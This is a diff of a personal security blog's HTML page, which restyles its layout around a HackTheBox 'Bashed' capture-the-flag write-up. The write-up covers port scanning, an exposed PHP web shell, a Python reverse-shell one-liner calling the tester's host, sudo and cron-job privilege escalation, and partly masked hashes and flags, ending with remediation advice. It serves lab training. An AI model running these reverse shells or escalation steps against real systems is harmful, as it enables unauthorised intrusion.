@@ -1,46 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>मंथन | Manthan</title>
-    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
-    <link id="codestylesheet" rel="stylesheet" type="text/css" media="screen" href="/static/css/atelier-forest-light.css">
-    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
-    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-   </head>
-  <body>
-    <div class="body">
-      <div class="menu">
-        <table>
-          <tr>
-            <td colspan="3"><a class="menu_home" href="/index.html">मंथन</a></td>
-          </tr>
-          <tr>
-            <td><a class="menu_archive" href="/archive.html">💾 Archive</a></td>
-            <td><a class="menu_tags" href="/tags.html">🔖 Tags</a></td>
-            <td><a class="menu_stats" href="/stats.html">📊 Stats</a></td>
-            <!--<td>-->
-            <!--  <label class="theme-switch" for="checkbox">-->
-            <!--    <input type="checkbox" id="checkbox" />-->
-            <!--    <div class="slider round"></div>-->
-            <!--  </label>-->
-            <!--</td>-->
-          </tr>
-        </table>
+<html lang="en" data-theme-mode="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Ankur Tyagi (@7h3rAm)">
+  <meta name="description" content="Personal Weblog">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Manthan</title>
+  <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp">
+  <link rel="stylesheet" href="/static/css/base.css">
+  <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+  <script src="/static/js/theme.js"></script>
+  <script src="/static/js/highlight.min.js"></script>
+  <script src="/static/js/hljs-bash.min.js"></script>
+  <script src="/static/js/hljs-python.min.js"></script>
+  <script src="/static/js/hljs-sql.min.js"></script>
+  <script src="/static/js/hljs-powershell.min.js"></script>
+  <script src="/static/js/hljs-line-numbers.min.js"></script>
+</head>
+<body>
+
+<header>
+  <div>
+    <h1 class="site-title"><a href="/" style="color:inherit;text-decoration:none;">manthan</a></h1>
+    <p class="meta">security research | code | writeups</p>
+  </div>
+</header>
+
+<article id="top">
+  <div class="post-header">
+    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+      <div>
+        <h1 class="post-title" style="margin:0; cursor:pointer;" onclick="toggleAllSections()">[HackTheBox] Bashed</h1>
       </div>
-      <div class="content">
-          <h1 class="h1 title collapsible" onclick="toggle(this);">[HackTheBox] Bashed</h1>
-    <div class="title"><code><span class="sparklines"><span style="color:#ffcc66;">▂</span><span style="color:#dc3545;">▅</span><span style="color:#6c757d;">█</span><span style="color:#007bff;">▄</span><span style="color:#dc3545;">▅</span><span style="color:#6c757d;">▃</span><span style="color:#6c757d;">▆</span><span style="color:#0c9;">▆</span><span style="color:#a50b5e;">▄</span><span style="color:#6610f2;">▄</span><span style="color:#dc3545;">▄</span><span style="color:#a50b5e;">▆</span><span style="color:#a50b5e;">▆</span><span style="color:#28a745;">▂</span><span style="color:#17a2b8;">█</span><span style="color:#a50b5e;">▆</span><span style="color:#2196f3;">▆</span><span style="color:#4caf50;">▄</span><span style="color:#ffc107;">▂</span><span style="color:#fd7e14;">▇</span><span style="color:#4caf50;">▁</span><span style="color:#5b92e5;">▆</span><span style="color:#007bff;">█</span><span style="color:#0c9;">█</span><span style="color:#99cc99;">▃</span><span style="color:#6c757d;">▆</span><span style="color:#5b92e5;">▂</span><span style="color:#007bff;">▅</span><span style="color:#8357ff;">▁</span><span style="color:#8357ff;">▁</span><span style="color:#e83e8c;">█</span><span style="color:#20b2aa;">▄</span><span style="color:#a50b5e;">▁</span><span style="color:#fe4164;">▄</span><span style="color:#6610f2;">▄</span><span style="color:#e83e8c;">█</span><span style="color:#e83e8c;">▆</span><span style="color:#6610f2;">▇</span><span style="color:#fe4164;">▆</span><span style="color:#28a745;">█</span><span style="color:#e83e8c;">▃</span><span style="color:#dc3545;">█</span><span style="color:#5b92e5;">▁</span><span style="color:#6f42c1;">▅</span><span style="color:#ffcc66;">▆</span><span style="color:#5b92e5;">▇</span><span style="color:#20c997;">▅</span><span style="color:#28a745;">▁</span><span style="color:#28a745;">▄</span><span style="color:#8357ff;">▃</span><span style="color:#e83e8c;">▂</span><span style="color:#007bff;">▁</span><span style="color:#28a745;">▂</span><span style="color:#f44336;">▇</span><span style="color:#a50b5e;">▃</span><span style="color:#ffcc66;">▃</span><span style="color:#5b92e5;">▃</span><span style="color:#5b92e5;">█</span><span style="color:#a50b5e;">▃</span><span style="color:#6f42c1;">▃</span><span style="color:#fe4164;">▄</span><span style="color:#5b92e5;">▁</span><span style="color:#fe4164;">▆</span><span style="color:#99cc99;">▇</span></span></code></div>
-    <hr>
-          <p style="float:left;"><a href="/posts/20200428_htb-archetype.html"> « </a>📅 published on <code>25/Jun/2020</code><a href="/posts/20200730_thm-yotf.html"> » </a></p>
-        <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
-    <div style="clear:both;"></div>
-    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+      <div class="meta" style="text-align:right;">
+        <div>25/Jun/2020</div>
+        <div class="tags"><a href="/tags.html#hackthebox">hackthebox</a>, <a href="/tags.html#writeup">writeup</a></div>
+      </div>
+    </div>
+    <nav class="post-nav" style="margin-top:0.3em;">
+      <a class="nav-prev" href="/posts/20200428_htb-archetype.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[HackTheBox] Archetype</span></a>      <a class="nav-next" href="/posts/20200730_thm-yotf.html"><span class="nav-title">[TryHackMe] Year of the Fox</span> <span class="arrow">&gt;&gt;&gt;</span></a>    </nav>
+  </div>
+
+  <div class="content">
+    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested active">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/118">Bashed</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_bashed/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -48,7 +50,7 @@
 <p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_bashed/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested active">1. <code>80/tcp/http/2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron_rootjobs">privesc_cron_rootjobs</a>  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested active">1. Here's the Nmap scan result:  </p>
 <pre class="nested active"><code># Nmap 7.80 scan initiated Fri May 29 19:04:11 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/xml/_quick_tcp_nmap.xml 10.10.10.68
 Nmap scan report for 10.10.10.68
@@ -100,7 +102,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="nested active"><code>/dev/phpbash.min.php
 /dev/phpbash.php
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested active">1. We visit the <code>/dev/phpbash.min.php</code> page and find the <code>phpbash</code> interactive web shell UI which enables command execution and further enumeration:  </p>
 <p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_bashed/screenshot05.png.webp" />  </p>
 <p class="nested active">2. We use a Python reverse shell to obtain interactive access on this system:  </p>
@@ -108,7 +110,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 <p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_bashed/screenshot06.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested active"><code>www-data@bashed&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@bashed&gt;  
@@ -140,7 +142,7 @@ root
 arrexel
 scriptmanager
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested active">1. We find that the user <code>www-data</code> can run any command as user <code>scriptmanager</code> using <code>sudo</code>:  </p>
 <pre class="nested active"><code>sudo -l
 sudo -u scriptmanager /bin/bash
@@ -164,13 +166,13 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 </code></pre>
 <p class="nested active"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_bashed/screenshot13.png.webp" />  </p>
 <p class="nested active"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_htb_bashed/screenshot14.png.webp" />  </p>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
 <ul class="nested active">
 <li>Production web server instances should not host developement tools like a PHP web shell. It allowed the attacker to gain interactive access of the target system.</li>
 <li>Service users should not be allowed to use <code>sudo</code>. This misconfiguration enabled attacker to switch to a more privileged user account.</li>
 <li>Cronjob files should be owned by the same user that will be allowed to run it. The attacker was able to use this misconfiguration to modify a file they own and get it executed by <code>root</code> user.</li>
 </ul>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested active"><code>arrexel:$1$mDpVXKQV$o6HkBjhl/e.S.bV96tMm6.:17504:............
 scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk.........................
@@ -179,41 +181,62 @@ scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF
 <pre class="nested active"><code>/home/arrexel/user.txt: 2c281f318555dbc1b8569...........
 /root/root.txt: cc4f0afe3a1026d402ba10..........
 </code></pre>
-<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested active">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/118">https://www.hackthebox.eu/home/machines/profile/118</a>  </li>
 <li><a href="https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2">https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2</a>  </li>
 <li><a href="https://0xdf.gitlab.io/2018/04/29/htb-bashed.html">https://0xdf.gitlab.io/2018/04/29/htb-bashed.html</a>  </li>
 </ul>
+  </div>
+
+  <nav class="post-nav" style="margin-top:1em;">
+    <a class="nav-prev" href="/posts/20200428_htb-archetype.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[HackTheBox] Archetype</span></a>    <a class="nav-next" href="/posts/20200730_thm-yotf.html"><span class="nav-title">[TryHackMe] Year of the Fox</span> <span class="arrow">&gt;&gt;&gt;</span></a>  </nav>
+</article>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var content = document.querySelector('.content');
+  if (content) {
+    var headings = content.querySelectorAll('h2,h3,h4,h5,h6');
+    headings.forEach(function(h) {
+      var link = document.createElement('a');
+      link.href = '#top';
+      link.className = 'top-link';
+      link.textContent = ' [^]';
+      link.style.fontSize = '0.8em';
+      link.style.color = 'var(--muted)';
+      h.appendChild(link);
+    });
+  }
+});
+</script>
+
+<footer>
+  <p class="nested active">cc-by-sa-4.0</p>
+</footer>
+
+<aside class="sidebar">
+  <div class="sidebar-content">
+    <h4 class="h4 collapsible" onclick="toggle(this);">navigation</h4>
+    <a href="/">home</a>
+    <a href="/archive.html">archive</a>
+    <a href="/tags.html">tags</a>
+    <a href="/stats.html">stats</a>
     <hr>
-          <p style="float:left;">« <a href="/posts/20200428_htb-archetype.html">[HackTheBox] Archetype</a> «</p>
-      <p style="float:right;">» <a href="/posts/20200730_thm-yotf.html">[TryHackMe] Year of the Fox</a> »</p>
-          </div>
-      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">  </a></div>
-      <script>hljs.initHighlightingOnLoad();</script>
-      <script>hljs.initLineNumbersOnLoad();</script>
-      <script>
-        function toggle(s){
-          s.classList.toggle("expanded");
-          var t=!1,i=!1,a=!1;
-          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
-          for(var l=s.nextElementSibling;l;){
-            if(t&&l.classList.contains("h2")){
-              l.classList.toggle("active");
-              break
-            }
-            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
-              l.classList.toggle("active");
-              break
-            }
-            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
-              l.classList.toggle("active");
-              break
-            }
-            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-          }
-        }
-      </script>
+    <a href="https://github.com/@7h3rAm">github</a>
+    <a href="https://twitter.com/@7h3rAm">twitter</a>
+    <hr>
+    <h4 class="h4 collapsible" onclick="toggle(this);">toggles</h4>
+    <div class="toggle-group">
+      <button class="toggle-btn toggle-theme" onclick="toggleThemeMode()">◑ theme</button>
+      <button class="toggle-btn toggle-density" onclick="toggleDensity()">▥ density</button>
+      <button class="toggle-btn toggle-width" onclick="toggleWidth()">▱ width</button>
+      <button class="toggle-btn toggle-justify" onclick="toggleJustify()">¶ justify</button>
+      <button class="toggle-btn toggle-collapse" onclick="toggleAllSections()">±</button>
     </div>
-  </body>
+  </div>
+</aside>
+
+<script>hljs.configure({ignoreUnescapedHTML: true}); hljs.highlightAll(); hljs.initLineNumbersOnLoad();</script>
+</body>
 </html>
